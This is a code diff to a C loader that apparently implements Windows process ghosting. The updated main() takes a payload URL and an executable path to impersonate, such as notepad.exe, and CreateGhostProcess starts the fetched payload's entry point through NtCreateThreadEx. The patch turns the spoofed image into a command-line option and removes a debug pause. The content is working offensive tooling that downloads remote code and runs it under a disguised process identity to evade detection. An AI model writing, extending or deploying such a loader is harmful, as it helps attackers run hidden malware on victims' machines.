@@ -542,8 +542,6 @@ BOOL CreateGhostProcess(IN LPWSTR SpoofExe, IN HANDLE* phGhostSection) {
     LPVOID GhostProcessEntryPoint = (LPBYTE)GhostImageBase + GhostProcessEntryPointRva;
     printf("[+] Ghost process entry point is: %p\n", GhostProcessEntryPoint);
 
-    //getchar();
-
     // Create the primary thread in the ghost process
     if ((status = nt_func.NtCreateThreadEx(
         &hThread,
@@ -568,17 +566,18 @@ BOOL CreateGhostProcess(IN LPWSTR SpoofExe, IN HANDLE* phGhostSection) {
 }
 
 int main(int argc, char* argv[]) {
-    if (argc < 2) {
-        wprintf(L"Usage: %s url (http://server:port/file.ext)\n", argv[0]);
+    if (argc < 3) {
+        wprintf(L"Usage: %s payload_url (e.g. http://server:port/file.ext) spoof_pe (e.g. c:\\windows\\system32\\notepad.exe)\n", argv[0]);
         return 1;
     }
 
     wchar_t* url = ConvertToWide(argv[1]);
+    LPWSTR SpoofedExe = ConvertToWide(argv[2]);
     HANDLE hFile = NULL;
     HANDLE hSection = NULL;
-    LPWSTR SpoofedExe = L"C:\\Windows\\System32\\notepad.exe";
 
-    printf("\nPayload URL: %ls\n\n", url);
+    printf("\nPayload URL: %ls\n", url);
+    printf("Spoofed Exe: %ls\n", SpoofedExe);
 
     if (!ResolveNtFunctions(&nt_func)) {
         return -1;
